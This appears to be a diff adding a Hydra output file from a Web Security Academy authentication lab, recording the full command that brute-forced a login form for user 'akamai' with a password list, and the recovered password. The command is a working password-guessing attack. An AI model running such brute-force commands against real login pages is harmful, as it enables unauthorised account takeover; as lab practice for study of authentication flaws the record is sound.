@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2023-10-13 05:54:04 on 0ad000a104e6bfe486303c7800f60081.web-security-academy.net http-post-form (hydra -l akamai -P /home/kali/Identification-and-Authentication-Failures/lab04/passwords.txt -u -f -I -V -o results.txt 0ad000a104e6bfe486303c7800f60081.web-security-academy.net http-post-form /login:username=^USER^&password=^PASS^&Login=Login:Log In)
+[443][http-post-form] host: 0ad000a104e6bfe486303c7800f60081.web-security-academy.net   login: akamai   password: zxcvbnm
